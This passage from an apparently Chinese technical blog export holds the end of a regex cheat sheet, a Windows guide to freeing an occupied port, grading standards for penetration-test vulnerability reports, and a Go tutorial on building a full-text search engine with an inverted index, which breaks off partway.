<h4 id="数字和英文字母组成，并且同时含有数字和英文字母"><a href="#数字和英文字母组成，并且同时含有数字和英文字母" class="headerlink" title="数字和英文字母组成，并且同时含有数字和英文字母"></a>数字和英文字母组成，并且同时含有数字和英文字母</h4><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">/^(?=.*[a-zA-Z])(?=.*\d).+$/</span><br></pre></td></tr></table></figure>

<h4 id="香港身份证"><a href="#香港身份证" class="headerlink" title="香港身份证"></a>香港身份证</h4><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">/^[a-zA-Z]\d&#123;<span class="number">6</span>&#125;\([\dA]\)$/</span><br></pre></td></tr></table></figure>

<h4 id="澳门身份证"><a href="#澳门身份证" class="headerlink" title="澳门身份证"></a>澳门身份证</h4><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">/^[<span class="number">1</span>|<span class="number">5</span>|<span class="number">7</span>]\d&#123;<span class="number">6</span>&#125;\(\d\)$/</span><br></pre></td></tr></table></figure>

<h4 id="台湾身份证"><a href="#台湾身份证" class="headerlink" title="台湾身份证"></a>台湾身份证</h4><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">/^[a-zA-Z][<span class="number">0</span><span class="number">-9</span>]&#123;<span class="number">9</span>&#125;$/</span><br></pre></td></tr></table></figure>

<h4 id="大写字母，小写字母，数字，特殊符号-amp-中任意3项密码"><a href="#大写字母，小写字母，数字，特殊符号-amp-中任意3项密码" class="headerlink" title="大写字母，小写字母，数字，特殊符号 @#$%^&amp;*~()-+=` 中任意3项密码"></a>大写字母，小写字母，数字，特殊符号 <code>@#$%^&amp;*</code>~()-+=` 中任意3项密码</h4><figure class="highlight"><table><tr><td class="code"><pre><span class="line">/^(?![a-zA-Z]+$)(?![A-Z0-9]+$)(?![A-Z\W_!@#$%^&amp;*`~()-+=]+$)(?![a-z0-9]+$)(?![a-z\W_!@#$%^&amp;*`~()-+=]+$)(?![0-9\W_!@#$%^&amp;*`~()-+=]+$)[a-zA-Z0-9\W_!@#$%^&amp;*`~()-+=]/</span><br></pre></td></tr></table></figure>

<h4 id="ASCII码表中的全部的特殊字符"><a href="#ASCII码表中的全部的特殊字符" class="headerlink" title="ASCII码表中的全部的特殊字符"></a>ASCII码表中的全部的特殊字符</h4><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">/[\x21-\x2F\x3A-\x40\x5B-\x60\x7B-\x7E]+<span class="regexp">/</span></span><br></pre></td></tr></table></figure>

<h4 id="正整数，不包含0"><a href="#正整数，不包含0" class="headerlink" title="正整数，不包含0"></a>正整数，不包含0</h4><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">/^\+?[<span class="number">1</span><span class="number">-9</span>]\d*$/</span><br></pre></td></tr></table></figure>

<h4 id="负整数，不包含0"><a href="#负整数，不包含0" class="headerlink" title="负整数，不包含0"></a>负整数，不包含0</h4><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">/^-[<span class="number">1</span><span class="number">-9</span>]\d*$/</span><br></pre></td></tr></table></figure>

<h4 id="整数"><a href="#整数" class="headerlink" title="整数"></a>整数</h4><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">/^-?[<span class="number">1</span><span class="number">-9</span>]\d*$/</span><br></pre></td></tr></table></figure>

<h4 id="浮点数"><a href="#浮点数" class="headerlink" title="浮点数"></a>浮点数</h4><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">/^(-?[<span class="number">1</span><span class="number">-9</span>]\d*\.\d+|-?<span class="number">0</span>\.\d*[<span class="number">1</span><span class="number">-9</span>]\d*|<span class="number">0</span>\<span class="number">.0</span>+)$/</span><br></pre></td></tr></table></figure>

<h4 id="浮点数-严格"><a href="#浮点数-严格" class="headerlink" title="浮点数(严格)"></a>浮点数(严格)</h4><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">/^(-?[<span class="number">1</span><span class="number">-9</span>]\d*\.\d+|-?<span class="number">0</span>\.\d*[<span class="number">1</span><span class="number">-9</span>])$/</span><br></pre></td></tr></table></figure>

<h4 id="email-支持中文邮箱"><a href="#email-支持中文邮箱" class="headerlink" title="email(支持中文邮箱)"></a>email(支持中文邮箱)</h4><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">/^[A-Za-z0<span class="number">-9</span>\u4e00-\u9fa5]+@[a-zA-Z0<span class="number">-9</span>_-]+(\.[a-zA-Z0<span class="number">-9</span>_-]+)+$/</span><br></pre></td></tr></table></figure>

<h4 id="域名-非网址-不包含协议"><a href="#域名-非网址-不包含协议" class="headerlink" title="域名(非网址, 不包含协议)"></a>域名(非网址, 不包含协议)</h4><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">/^([<span class="number">0</span><span class="number">-9</span>a-zA-Z-]&#123;<span class="number">1</span>,&#125;\.)+([a-zA-Z]&#123;<span class="number">2</span>,&#125;)$/</span><br></pre></td></tr></table></figure>

]]></content>
      <tags>
        <tag>随笔</tag>
      </tags>
  </entry>
  <entry>
    <title>端口占用怎么解决？</title>
    <url>/articles/%E7%AB%AF%E5%8F%A3%E5%8D%A0%E7%94%A8%E6%80%8E%E4%B9%88%E8%A7%A3%E5%86%B3-/</url>
    <content><![CDATA[<ol>
<li><p>按键盘win+r 打开运行界面，输入<code>cmd</code>，确定，打开管理员界面</p>
</li>
<li><p>输入 <code>netstat -aon | findstr :80</code></p>
<p><img src="/articles/端口占用怎么解决-/1.png" alt></p>
</li>
<li><p>输入  <code>tasklist|findstr &quot;4188&quot;</code> 4188是第2步骤找到的PID</p>
<p><img src="/articles/端口占用怎么解决-/2.png" alt></p>
</li>
<li><p>找到端口对应的服务名称,然后去关掉就行了</p>
</li>
</ol>
]]></content>
      <categories>
        <category>服务器运维</category>
      </categories>
  </entry>
  <entry>
    <title>渗透测试报告标准</title>
    <url>/articles/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%8A%A5%E5%91%8A%E6%A0%87%E5%87%86/</url>
    <content><![CDATA[<h3 id="优秀的报告标准"><a href="#优秀的报告标准" class="headerlink" title="优秀的报告标准"></a>优秀的报告标准</h3><p><strong>漏洞标题</strong></p>
<p>标题描述：标题可简明扼要说明问题，描述语言规范化。如“testasp.vulnweb.com站showforum.asp请求存在SQL注入漏洞”“testasp.vulnweb.com站查看订单处存在越权漏洞”</p>
<p><strong>基本信息</strong></p>
<p>漏洞类型：填写信息准确无误</p>
<p>漏洞等级：填写信息准确无误</p>
<p>厂商信息：填写信息准确无误</p>
<p><strong>漏洞描述</strong></p>
<p>漏洞简述：包含漏洞概述，漏洞危害</p>
<p><strong>漏洞正文</strong></p>
<p>漏洞复现过程：复现过程完整，无需二次沟通或补充数据</p>
<p>分步骤图文描述：有详细的漏洞复现步骤、测试步骤，并每个步骤配有图文描述。平台、厂商可根据描述一次性完成漏洞复测</p>
<p>漏洞危害证明：漏洞危害证明完整，无误</p>
<p>URL及重要参数：URL及重要参数完整，无误</p>
<p>格式排版、专业术语：格式排版规范；无病句错别字；描述用语专业化，规范化</p>
<p><strong>修复建议</strong></p>
<p>漏洞修复建议：修复建议对开发有较大实用性，如修复思路，修复代码样式，伪代码等</p>
<h3 id="良好的报告标准"><a href="#良好的报告标准" class="headerlink" title="良好的报告标准"></a>良好的报告标准</h3><p><strong>漏洞标题</strong></p>
<p>标题描述：标题可基本概括漏洞情况，描述语言缺乏规范性。如“一处注入漏洞”“另外一处注入”“网站某处存在越权”</p>
<p><strong>基本信息</strong></p>
<p>漏洞类型：填写信息准确无误</p>
<p>漏洞等级：填写信息准确无误</p>
<p>厂商信息：填写信息准确无误</p>
<p><strong>漏洞描述</strong></p>
<p>漏洞简述：包含漏洞概述</p>
<p><strong>漏洞正文</strong></p>
<p>漏洞复现过程：复现过程基本完整，个别地方描述不清或缺少数据，对漏洞评估、复现有一定影响</p>
<p>分步骤图文描述：关键测试步骤完整，但复现步骤缺失，对漏洞复现有一定影响。如直接粘贴出漏洞利用请求包，但缺乏测试步骤如何获取此请求包，需要二次沟通方才可复现</p>
<p>漏洞危害证明：漏洞危害证明基本完整</p>
<p>URL及重要参数：URL及重要参数基本完整</p>
<p>格式排版、专业术语：格式排版不影响正常阅读；个别病句错别字；描述用语较为规范化</p>
<p><strong>修复建议</strong></p>
<p>漏洞修复建议：修复建议基本无误，但过于简单，无实际参考意义。如“控制权限”，“过滤参数”，“校验身份”</p>
<h3 id="较差的报告标准"><a href="#较差的报告标准" class="headerlink" title="较差的报告标准"></a>较差的报告标准</h3><p><strong>漏洞标题</strong></p>
<p>标题描述：标题描述不清；与漏洞详情不符；夸大漏洞级别及危害</p>
<p><strong>基本信息</strong></p>
<p>漏洞类型：填写信息准确无误</p>
<p>漏洞等级：填写信息准确无误</p>
<p>厂商信息：填写信息准确无误</p>
<p><strong>漏洞描述</strong></p>
<p>漏洞简述：无效的漏洞描述，如“RT”，“请看详情”</p>
<p><strong>漏洞正文</strong></p>
<p>漏洞复现过程：复现过程关键步骤缺失，影响正常的漏洞评估、复现</p>
<p>分步骤图文描述：无测试步骤；无文字描述，直接粘贴截图。对漏洞评估、复现、修复工作产生较大影响。</p>
<p>漏洞危害证明：无有效漏洞危害证明或主管臆断危害。</p>
<p>URL及重要参数：缺少关键URL，核心参数，影响复现</p>
<p>格式排版、专业术语：格式排版混乱，影响正常阅读；出现较多的病句，错别字；过于口语化、网络化用语，如“你懂的”</p>
<p><strong>修复建议</strong></p>
<p>漏洞修复建议：无意义或错误的修复建议。如“不知道”，“你懂的”，“问开发”，“修复”</p>
]]></content>
      <categories>
        <category>安全研究</category>
      </categories>
  </entry>
  <entry>
    <title>实现一个简单的全文检索引擎</title>
    <url>/articles/%E5%AE%9E%E7%8E%B0%E4%B8%80%E4%B8%AA%E7%AE%80%E5%8D%95%E7%9A%84%E5%85%A8%E6%96%87%E6%A3%80%E7%B4%A2%E5%BC%95%E6%93%8E/</url>
    <content><![CDATA[<p>全文检索是人们每天都在使用的工具之一。如果你曾经在google上搜索过“golang使用情况”或试图在电子商务网站上找到“室内无线摄像头”，你都会使用某种全文检索。</p>
<p>全文检索（FTS）是一种在文档集合中搜索文本的技术。文档可以引用网页、报纸文章、电子邮件或其他任何结构文本。</p>
<p>今天我们要建造我们自己的FTS引擎。在这篇文章的最后，我们将能够在不到一毫秒的时间内搜索数百万个文档。我们将从简单的搜索查询开始，比如“给我包含单词cat的所有文档”，然后扩展引擎以支持更复杂的布尔查询。</p>
<blockquote>
<p>注：最著名的FTS引擎是<a href="https://lucene.apache.org/" target="_blank" rel="noopener">Lucene</a>（以及在此基础上构建的 <a href="https://www.elastic.co/cn/" target="_blank" rel="noopener">Elasticsearch</a> 和 <a href="https://lucene.apache.org/solr/" target="_blank" rel="noopener">Solr</a> ）。</p>
</blockquote>
<h3 id="为什么选择FTS"><a href="#为什么选择FTS" class="headerlink" title="为什么选择FTS"></a>为什么选择FTS</h3><p>在我们开始编写代码之前，您可能会问：“我们不能只使用grep，或者使用一个循环来检查每个文档是否包含我要查找的单词？” 是的，我们可以，但这并不是最好的方式。</p>
<h3 id="语料库"><a href="#语料库" class="headerlink" title="语料库"></a>语料库</h3><p>点击下载 <a href="https://dumps.wikimedia.org/enwiki/latest/enwiki-latest-abstract1.xml.gz" target="_blank" rel="noopener">dumps.wikimedia.org</a> 语料。</p>
<p>语料的格式如下：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>Wikipedia: Kit-Cat Klock<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">url</span>&gt;</span>https://en.wikipedia.org/wiki/Kit-Cat_Klock<span class="tag">&lt;/<span class="name">url</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">abstract</span>&gt;</span>The Kit-Cat Klock is an art deco novelty wall clock shaped like a grinning cat with cartoon eyes that swivel in time with its pendulum tail.<span class="tag">&lt;/<span class="name">abstract</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="加载文档"><a href="#加载文档" class="headerlink" title="加载文档"></a>加载文档</h3><p>首先，我们需要加载上一步下载的文档。</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> (</span><br><span class="line">    <span class="string">"encoding/xml"</span></span><br><span class="line">    <span class="string">"os"</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> document <span class="keyword">struct</span> &#123;</span><br><span class="line">    Title <span class="keyword">string</span> <span class="string">`xml:"title"`</span></span><br><span class="line">    URL   <span class="keyword">string</span> <span class="string">`xml:"url"`</span></span><br><span class="line">    Text  <span class="keyword">string</span> <span class="string">`xml:"abstract"`</span></span><br><span class="line">    ID    <span class="keyword">int</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">loadDocuments</span><span class="params">(path <span class="keyword">string</span>)</span> <span class="params">([]document, error)</span></span> &#123;</span><br><span class="line">    f, err := os.Open(path)</span><br><span class="line">    <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">nil</span>, err</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">defer</span> f.Close()</span><br><span class="line"></span><br><span class="line">    dec := xml.NewDecoder(f)</span><br><span class="line">    dump := <span class="keyword">struct</span> &#123;</span><br><span class="line">        Documents []document <span class="string">`xml:"doc"`</span></span><br><span class="line">    &#125;&#123;&#125;</span><br><span class="line">    <span class="keyword">if</span> err := dec.Decode(&amp;dump); err != <span class="literal">nil</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">nil</span>, err</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    docs := dump.Documents</span><br><span class="line">    <span class="keyword">for</span> i := <span class="keyword">range</span> docs &#123;</span><br><span class="line">        docs[i].ID = i</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> docs, <span class="literal">nil</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>每个加载的文档都会被分配一个唯一的标识符。为了简单起见，第一个加载的文档分配ID=0，第二个ID=1，依此类推。</p>
<h3 id="常规搜索测试"><a href="#常规搜索测试" class="headerlink" title="常规搜索测试"></a>常规搜索测试</h3><p><strong>关键词搜索</strong></p>
<p>现在我们已经将所有文档加载到内存中，我们可以尝试找到关于猫的文档。首先，让我们遍历所有文档并检查它们是否包含子字符串cat：</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">search</span><span class="params">(docs []document, term <span class="keyword">string</span>)</span> []<span class="title">document</span></span> &#123;</span><br><span class="line">    <span class="keyword">var</span> r []document</span><br><span class="line">    <span class="keyword">for</span> _, doc := <span class="keyword">range</span> docs &#123;</span><br><span class="line">        <span class="keyword">if</span> strings.Contains(doc.Text, term) &#123;</span><br><span class="line">            r = <span class="built_in">append</span>(r, doc)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> r</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在我的笔记本电脑上，搜索需要 103ms, 还不错。 如果您抽查了输出中的一些文档， 您可能会注意到该函数与caterpillar和category匹配，但cat与大写字母C不匹配。这不是我想要的。</p>
<p>在继续之前，我们需要解决两个问题：</p>
<ul>
<li><p>使搜索不区分大小写（因此Cat也匹配）。</p>
</li>
<li><p>匹配单词边界而不是子字符串（因此caterpiller和communication不匹配）。</p>
</li>
</ul>
<p><strong>正则表达式搜索</strong></p>
<p>一个快速想到并允许实现这两个需求的解决方案是正则表达式。</p>
<p>例如：<code>(?i)\bcat\b</code></p>
<ul>
<li><p><code>(?i)</code> 大小写不敏感</p>
</li>
<li><p><code>\b</code> 匹配单词边界（一边是单词字符，另一边不是单词字符的位置）</p>
</li>
</ul>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">search</span><span class="params">(docs []document, term <span class="keyword">string</span>)</span> []<span class="title">document</span></span> &#123;</span><br><span class="line">    re := regexp.MustCompile(<span class="string">`(?i)\b`</span> + term + <span class="string">`\b`</span>) <span class="comment">// Don't do this in production, it's a security risk. term needs to be sanitized.</span></span><br><span class="line">    <span class="keyword">var</span> r []document</span><br><span class="line">    <span class="keyword">for</span> _, doc := <span class="keyword">range</span> docs &#123;</span><br><span class="line">        <span class="keyword">if</span> re.MatchString(doc.Text) &#123;</span><br><span class="line">            r = <span class="built_in">append</span>(r, doc)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> r</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>呃，搜索花了2秒多。如您所见，即使有60万个文档，事情也开始变得缓慢。虽然该方法易于实现，但它的扩展性并不好。随着数据集越来越大，我们需要扫描越来越多的文档。该算法的时间复杂度是线性的, 需要扫描的文档数等于文档总数。如果我们有600万份文档，而不是60万份，搜索需要20秒。所以我们还需要优化。</p>
<h3 id="反向索引"><a href="#反向索引" class="headerlink" title="反向索引"></a>反向索引</h3><p>为了使搜索查询更快，我们将对文本进行预处理并预先建立索引。</p>
<p>FTS的核心是一种称为反向索引的数据结构, 将文档中的每个单词与包含该单词的文档相关联。</p>
<p>例如：</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line">documents = &#123;</span><br><span class="line">    <span class="number">1</span>: <span class="string">"a donut on a glass plate"</span>,</span><br><span class="line">    <span class="number">2</span>: <span class="string">"only the donut"</span>,</span><br><span class="line">    <span class="number">3</span>: <span class="string">"listen to the drum machine"</span>,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">index = &#123;</span><br><span class="line">    <span class="string">"a"</span>: [<span class="number">1</span>],</span><br><span class="line">    <span class="string">"donut"</span>: [<span class="number">1</span>, <span class="number">2</span>],</span><br><span class="line">    <span class="string">"on"</span>: [<span class="number">1</span>],</span><br><span class="line">    <span class="string">"glass"</span>: [<span class="number">1</span>],</span><br><span class="line">    <span class="string">"plate"</span>: [<span class="number">1</span>],</span><br><span class="line">    <span class="string">"only"</span>: [<span class="number">2</span>],</span><br><span class="line">    <span class="string">"the"</span>: [<span class="number">2</span>, <span class="number">3</span>],</span><br><span class="line">    <span class="string">"listen"</span>: [<span class="number">3</span>],</span><br><span class="line">    <span class="string">"to"</span>: [<span class="number">3</span>],</span><br><span class="line">    <span class="string">"drum"</span>: [<span class="number">3</span>],</span><br><span class="line">    <span class="string">"machine"</span>: [<span class="number">3</span>],</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>下面是一个倒排索引的真实例子。书名索引书中一个术语引用页码的索引：</p>
<p><img src="/articles/实现一个简单的全文检索引擎/book-index.png" alt="Book Index"></p>
<h3 id="文本分析"><a href="#文本分析" class="headerlink" title="文本分析"></a>文本分析</h3><p>在开始构建索引之前，我们需要将原始文本分解为一个适合索引和搜索的单词（标记）列表。</p>
<p>文本分析器由一个分词器器和多个过滤器组成。</p>
<p><img src="/articles/实现一个简单的全文检索引擎/text-analysis.png" alt></p>
<h4 id="分词器"><a href="#分词器" class="headerlink" title="分词器"></a>分词器</h4><p>分词器是文本分析的第一步。它的工作是将文本转换为标记列表。我们的实现在单词边界上拆分文本并删除标点符号：</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">tokenize</span><span class="params">(text <span class="keyword">string</span>)</span> []<span class="title">string</span></span> &#123;</span><br><span class="line">    <span class="keyword">return</span> strings.FieldsFunc(text, <span class="function"><span class="keyword">func</span><span class="params">(r <span class="keyword">rune</span>)</span> <span class="title">bool</span></span> &#123;</span><br><span class="line">        <span class="comment">// Split on any character that is not a letter or a number.</span></span><br><span class="line">        <span class="keyword">return</span> !unicode.IsLetter(r) &amp;&amp; !unicode.IsNumber(r)</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight go"><table><tr><td class="code"><pre><span class="line">&gt; tokenize(<span class="string">"A donut on a glass plate. Only the donuts."</span>)</span><br><span class="line"></span><br><span class="line">[<span class="string">"A"</span>, <span class="string">"donut"</span>, <span class="string">"on"</span>, <span class="string">"a"</span>, <span class="string">"glass"</span>, <span class="string">"plate"</span>, <span class="string">"Only"</span>, <span class="string">"the"</span>, <span class="string">"donuts"</span>]</span><br></pre></td></tr></table></figure>

<h4 id="过滤器"><a href="#过滤器" class="headerlink" title="过滤器"></a>过滤器</h4><p>在大多数情况下，仅仅将文本转换为标记列表是不够的。为了使文本更易于索引和搜索，我们需要进行额外的规范化。</p>
<h5 id="大小写过滤"><a href="#大小写过滤" class="headerlink" title="大小写过滤"></a>大小写过滤</h5><p>为了使搜索不区分大小写，小写过滤器将标记转换为小写。cAt、Cat和caT规范化为cat。 稍后，当我们查询索引时，我们也会降低搜索词的大小写。这将使搜索词cAt能与文本cAt匹配。</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">lowercaseFilter</span><span class="params">(tokens []<span class="keyword">string</span>)</span> []<span class="title">string</span></span> &#123;</span><br><span class="line">    r := <span class="built_in">make</span>([]<span class="keyword">string</span>, <span class="built_in">len</span>(tokens))</span><br><span class="line">    <span class="keyword">for</span> i, token := <span class="keyword">range</span> tokens &#123;</span><br><span class="line">        r[i] = strings.ToLower(token)</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> r</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight go"><table><tr><td class="code"><pre><span class="line">&gt; lowercaseFilter([]<span class="keyword">string</span>&#123;<span class="string">"A"</span>, <span class="string">"donut"</span>, <span class="string">"on"</span>, <span class="string">"a"</span>, <span class="string">"glass"</span>, <span class="string">"plate"</span>, <span class="string">"Only"</span>, <span class="string">"the"</span>, <span class="string">"donuts"</span>&#125;)</span><br><span class="line"></span><br><span class="line">[<span class="string">"a"</span>, <span class="string">"donut"</span>, <span class="string">"on"</span>, <span class="string">"a"</span>, <span class="string">"glass"</span>, <span class="string">"plate"</span>, <span class="string">"only"</span>, <span class="string">"the"</span>, <span class="string">"donuts"</span>]</span><br></pre></td></tr></table></figure>

<h5 id="去除停止语"><a href="#去除停止语" class="headerlink" title="去除停止语"></a>去除停止语</h5><p>几乎所有的英语文本都包含了像a，I，the或be这样的常用词。这样的话叫做停止语。我们将删除它们，因为几乎所有文档都会匹配停止字。<br>没有“官方”的停止语列表。我们把<a href="https://en.wikipedia.org/wiki/Most_common_words_in_English" target="_blank" rel="noopener">OEC rank</a>前10名排除在外。请根据需要添加：</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> stopwords = <span class="keyword">map</span>[<span class="keyword">string</span>]<span class="keyword">struct</span>&#123;&#125;&#123; <span class="comment">// I wish Go had built-in sets.</span></span><br><span class="line">    <span class="string">"a"</span>: &#123;&#125;, <span class="string">"and"</span>: &#123;&#125;, <span class="string">"be"</span>: &#123;&#125;, <span class="string">"have"</span>: &#123;&#125;, <span class="string">"i"</span>: &#123;&#125;,</span><br><span class="line">    <span class="string">"in"</span>: &#123;&#125;, <span class="string">"of"</span>: &#123;&#125;, <span class="string">"that"</span>: &#123;&#125;, <span class="string">"the"</span>: &#123;&#125;, <span class="string">"to"</span>: &#123;&#125;,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">stopwordFilter</span><span class="params">(tokens []<span class="keyword">string</span>)</span> []<span class="title">string</span></span> &#123;</span><br><span class="line">    r := <span class="built_in">make</span>([]<span class="keyword">string</span>, <span class="number">0</span>, <span class="built_in">len</span>(tokens))</span><br><span class="line">    <span class="keyword">for</span> _, token := <span class="keyword">range</span> tokens &#123;</span><br><span class="line">        <span class="keyword">if</span> _, ok := stopwords[token]; !ok &#123;</span><br><span class="line">            r = <span class="built_in">append</span>(r, token)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> r</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight go"><table><tr><td class="code"><pre><span class="line">&gt; stopwordFilter([]<span class="keyword">string</span>&#123;<span class="string">"a"</span>, <span class="string">"donut"</span>, <span class="string">"on"</span>, <span class="string">"a"</span>, <span class="string">"glass"</span>, <span class="string">"plate"</span>, <span class="string">"only"</span>, <span class="string">"the"</span>, <span class="string">"donuts"</span>&#125;)</span><br><span class="line"></span><br><span class="line">[<span class="string">"donut"</span>, <span class="string">"on"</span>, <span class="string">"glass"</span>, <span class="string">"plate"</span>, <span class="string">"only"</span>, <span class="string">"donuts"</span>]</span><br></pre></td></tr></table></figure>

<h5 id="去除多形词"><a href="#去除多形词" class="headerlink" title="去除多形词"></a>去除多形词</h5><p>由于语法规则，文档可能包含同一单词的不同形式。词干分析将单词简化为基本形式。例如，fishing、fished和fisher 可以简化为 fish 。</p>
<p>实现词干分析器是一项非常重要的任务，这篇文章不讨论它。我们将使用现有的模块之一</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> snowballeng <span class="string">"github.com/kljensen/snowball/english"</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">stemmerFilter</span><span class="params">(tokens []<span class="keyword">string</span>)</span> []<span class="title">string</span></span> &#123;</span><br><span class="line">    r := <span class="built_in">make</span>([]<span class="keyword">string</span>, <span class="built_in">len</span>(tokens))</span><br><span class="line">    <span class="keyword">for</span> i, token := <span class="keyword">range</span> tokens &#123;</span><br><span class="line">        r[i] = snowballeng.Stem(token, <span class="literal">false</span>)</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> r</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight go"><table><tr><td class="code"><pre><span class="line">&gt; stemmerFilter([]<span class="keyword">string</span>&#123;<span class="string">"donut"</span>, <span class="string">"on"</span>, <span class="string">"glass"</span>, <span class="string">"plate"</span>, <span class="string">"only"</span>, <span class="string">"donuts"</span>&#125;)</span><br><span class="line"></span><br><span class="line">[<span class="string">"donut"</span>, <span class="string">"on"</span>, <span class="string">"glass"</span>, <span class="string">"plate"</span>, <span class="string">"only"</span>, <span class="string">"donut"</span>]</span><br></pre></td></tr></table></figure>

<p>注: 词干并不总是一个有效的词。例如，airline 和 airlin。</p>
<h5 id="合并"><a href="#合并" class="headerlink" title="合并"></a>合并</h5><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">analyze</span><span class="params">(text <span class="keyword">string</span>)</span> []<span class="title">string</span></span> &#123;</span><br><span class="line">    tokens := tokenize(text)</span><br><span class="line">    tokens = lowercaseFilter(tokens)</span><br><span class="line">    tokens = stopwordFilter(tokens)</span><br><span class="line">    tokens = stemmerFilter(tokens)</span><br><span class="line">    <span class="keyword">return</span> tokens</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>分词器和过滤器将句子转换成一个标记列表：</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line">&gt; analyze(<span class="string">"A donut on a glass plate. Only the donuts."</span>)</span><br><span class="line"></span><br><span class="line">[<span class="string">"donut"</span>, <span class="string">"on"</span>, <span class="string">"glass"</span>, <span class="string">"plate"</span>, <span class="string">"only"</span>, <span class="string">"donut"</span>]</span><br></pre></td></tr></table></figure>

<h3 id="创建索引"><a href="#创建索引" class="headerlink" title="创建索引"></a>创建索引</h3><p>回到反向索引, 它将文档中的每个单词映射到文档id。map是存储映射的一个很好选择。map中的键是一个令牌（字符串），值是一个文档ID列表：</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">type</span> index <span class="keyword">map</span>[<span class="keyword">string</span>][]<span class="keyword">int</span></span><br></pre></td></tr></table></figure>

<p>建立索引包括分析文档并将其ID添加到映射关系中：</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(idx index)</span> <span class="title">add</span><span class="params">(docs []document)</span></span> &#123;</span><br><span class="line">    <span class="keyword">for</span> _, doc := <span class="keyword">range</span> docs &#123;</span><br><span class="line">        <span class="keyword">for</span> _, token := <span class="keyword">range</span> analyze(doc.Text) &#123;</span><br><span class="line">            ids := idx[token]</span><br><span class="line">            <span class="keyword">if</span> ids != <span class="literal">nil</span> &amp;&amp; ids[<span class="built_in">len</span>(ids)<span class="number">-1</span>] == doc.ID &#123;</span><br><span class="line">                <span class="comment">// Don't add same ID twice.</span></span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            &#125;</span><br><span class="line">            idx[token] = <span class="built_in">append</span>(ids, doc.ID)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    idx := <span class="built_in">make</span>(index)</span><br><span class="line">    idx.add([]document&#123;&#123;ID: <span class="number">1</span>, Text: <span class="string">"A donut on a glass plate. Only the donuts."</span>&#125;&#125;)</span><br><span class="line">    idx.add([]document&#123;&#123;ID: <span class="number">2</span>, Text: <span class="string">"donut is a donut"</span>&#125;&#125;)</span><br><span class="line">    fmt.Println(idx)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

